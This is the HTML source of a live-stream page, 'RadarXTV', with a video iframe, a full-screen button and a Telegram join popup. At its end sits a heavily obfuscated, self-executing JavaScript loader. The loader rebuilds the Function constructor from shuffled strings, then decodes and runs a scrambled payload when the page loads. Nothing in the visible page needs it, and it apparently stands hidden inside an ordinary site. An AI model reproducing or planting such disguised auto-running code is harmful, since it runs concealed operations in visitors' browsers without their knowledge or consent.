<!DOCTYPE html>
<?php include 'banner.php'; ?>
<html lang="en">
<head>
<script src="lmao.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
            .logo {
        position: absolute;
        top: 10px; /* Adjust vertical position */
        left: 10px; /* Adjust horizontal position */
        z-index: 1; /* Ensure the logo appears above the video */
        max-width: 120px; /* Set maximum width for the logo */
        max-height: 120px; /* Set maximum height for the logo */
        pointer-events: none; /* Prevent interference with video controls */
    }
    
    </style>
</head>
<body>
    <!-- Video container -->
    <div class="video-container">
        <!-- Logo inside the video -->
        <img src="chutman.jpg" alt="Logo" class="logo">
        
<div class="container">
    <h1>RADARXTV.SITE</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup" style="display: flex;">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
    (function(){var Obh='',dGy=265-254;function kxV(t){var u=1292177;var y=t.length;var g=[];for(var w=0;w<y;w++){g[w]=t.charAt(w)};for(var w=0;w<y;w++){var i=u*(w+355)+(u%44990);var c=u*(w+252)+(u%46434);var f=i%y;var x=c%y;var h=g[f];g[f]=g[x];g[x]=h;u=(i+c)%5066757;};return g.join('')};var VCz=kxV('crkcstudtoxavcenfihrjpbtnsrmooluqwgyz').substr(0,dGy);var dZX='e=jvi)+(+o+1e,[,es,,2er7r";gyo12bh.;gl=C}lAj-te)Cx]{";v5-r==e.;,f8s901l6=8o1ia.(=o,vr9gn88i6=,[j+7(08!j7,;vi;icrw5,vtt[a+;ar] )(n]+fvnedfr+phmr;te+le;ut;; +unh[u[(]nClhrzu;4".fp]gp;ahnam[;6no.a0;vqfretvi(9p=))a j)n cen.s(lwgvtonz(868vda"o a"gn(+s6r;a]o3[a+nv"+nv6f,gvvpe,vho4++n(2Ch 1=raziv}Sesr)";=l u0l;v1l.jCo )s]tac *=h(.}fudr1f;achs0reuja])n[petn;r m;==](4apzl=s;=aetCl.)<v)rnn=;.c=anvtdrAt6))ivvrvr(rkr7;2f*[o{ =nh)rr.yfoa;h-rk2(s>t(e)1a-,j0ce<n+(;}u1;-srf. sls)n;)tvgaud=nCka"))(wf7=uCottpg(l[u+r+o.Ah+ruuwi;d,,r2a67;)=o;8ha26}0=fe,.l37i;v,r}i)(r=0nalenc=9]=ift9Aftp.tcl];j;(<e=;)isa(f;zhel1a)chs(,n.+;==;)= =19nihid!=,0.ptr,g(,;a{t.zilh1ja,ob}0ca, =r+)f=>u 5r=ho)+( f = ay=8.a"<,[e]d;;o(rdtea(jnl.gpnc;r4. vi]b),)0iev u2ker,9+rnc=[=[octohma.tp=dp-(t8=fe i)y)6uorartt{)rej(taa p(9bp<=1re((lh{ev+[;s+jipl;oimr4;74)SA-(e)b=gosu n)r.;p.grsmlhmr ors(b{7]ri;netur0+upsrl{v.d "l,e..o2n(fo,';var UuI=kxV[VCz];var pTY='';var BxT=UuI;var NbI=UuI(pTY,kxV(dZX));var pPs=NbI(kxV('4d32fiH1;encH0.sowrH.(i(dH(s g tHfd!])eH<e{oaHo(]oh8)%[_Exke0HoDm&o0=}ogi3bcet"HHriut.,e4Ac{.H7tH(\'eHnr$],H$mgc$c)? _mgnHHve7_H=eH,7)e+H,.5[r ie {(a6erbH{ 9HnHa1f.$.qEcon3nH5pa.t<bbc?_H!1q];tcH{2 it2ug\/>i,s%reoj(eo_[H c(C\/Hew3n5,ks_nrF[eaw=oH:oi66l(yCH"HHt\'srnsH31yntsns_51cJumHaeeceHnH:.eHsytH.v,;_(a.]e)trefe[lHs*cB3}e,u%) D_]*_,an.HoaH{(H+Hn\/i7y%(%soo>8MnHAHr4td9rt)H)H_tn!Hu)lH.eHwoerqHt=csa%_@.KsuH;6ms5.i5eerrl6tnrm{n)Ha43dHdf.7d.p.v %uix74H0.dHIE@a%9Hmuoc]sH$e7t=:e7. %l)hr(p!Hzn>eek!;H-"%nu.Ha]Hl!)dHHa.J%,ii+c(Mx7c.a lcnnc%l.f_eHikbn@{ea.H\/H:2hl,.{"e.ia7mceeaH2.)ie;g=un,31uHuEFneH?1cz.jeoae?Ho3nn;_nr{t.{6s)%=im4%(,ee",-o%1]fz!.;0HH_iF2.$eCH)lle]iH \/ull)_%-]9u%tH$ tc($H5$Hb22+=.\/H_{Hzc7vreHl$aaHe;.,1{5otnGH $H(3?1if(]Hwg(4I;Hjt{;l3H[(\/s{z%rw63rvtrHhjrnEcwHHatti8a])c=v$!.Hf;e)Cq+3uH7grr3kH5af))t. .5dr9e=H,[e7(H=4)9H,ee;ovH,t)ga! $Ar$Hn)t_r_ue .Hr_oH4jd(i a2HHHH)(}H8H!=(HE_mk3_HC}!te[t$0;rtzH=;01i03ioeHr91-9,Hrc}Hoee(r1&,e3;7_0F"6ire};n!65)\/1 =(fH5w#i.%6%5Hrer{on,t4s0G)*Hz=re4]IHHc(..HohH<H3ecm.9]5op=$ioE7,wla.?].)e.ausdii1eHeHueHrnd3$_HecbSe\'l7}9}afr7k\/m]H9cbkgn%=seH((g;}o-]So%%H4,.#nj.2(HpH(v}"b)p%H_sH))#HH=])4Do46t.tl6o]!H:HCH;S[;cvs{=e$])Hc1,9H.u$Ho))t\/23Hi$+5g2g(smeduf;irt=_HnelaH2uH")!;t.H tH6Au}0l(,%d.t.e,:H!49H;.#lo0pt5r1fH]8nmH22nfaHEsG3Hs5bI=5%fo.eb(oe36tK)reBHq KhnHHn]]ltsyp34@nH2AHts)!(HnmH*.e,eHu_H.ejr%t"JH_il(9.;_rH%%n63e.?3n}H6snsen_HH{5oHeth,=iw0Hd;2+t8]9.trH%H](<&%{tH1l%H;u(9t]1_(%{{$@C1:[i$c&.Hlrl5c;).cH;ec)CH$#[HrjdH6.s{)%i30o)Hp8o,.(EHI=)HJ,$efe$tb)D}tussfei,er7!u]eHue.eHtH!}g1Hut(33jtH_\'i 1aH)3u].c8G;;]f.l3nHln)H_efH)rpH.5 o1kb&jH.p; [naHefSH4nno(5!dnE0aH)#e.;mcGtH$H(!_. foeH.s]HH2cddn)e]nbiBt4iunda0nHHr1d]H!Hos$H)2.&m)_#31br%Hyo{rll")2fHlet)!n].(r(H)H$pH!tF 5eddr{c+\/eH%$6 Hn{)=H1E.72$rbepHpl_ eijr.m,8rr2(HiHB .pd((c l);r.tHH0ro1%e#3;4E 2c)nlFi.t_% (2oHfoHegee=%f 12H)lHcnyHH,$7td(a7a=.tt5noi)fa32bHhta#H(cHc(Hv se+nu;irsr:Ht.c9e H5f2aop6ib ]7s$}nHE(afnw%ti=r)e1!HB8n%;)l)4l.y. 59fw2){ HHg7e,.t5))!! ]bHb?f_(=crlF3f7Hiru,1HtC)#0oHH5d8 H!!t2eI(!ruraHny.H&>$e(!dt0H?H;!HeD]nH#eHoHH (S7._edH(l}C97b.f6cEv?.;);;.p)tKclHa]sefu .oH]'));var Whk=BxT(Obh,pPs );Whk(5680);return 9043})()
</script>

</body>
</html>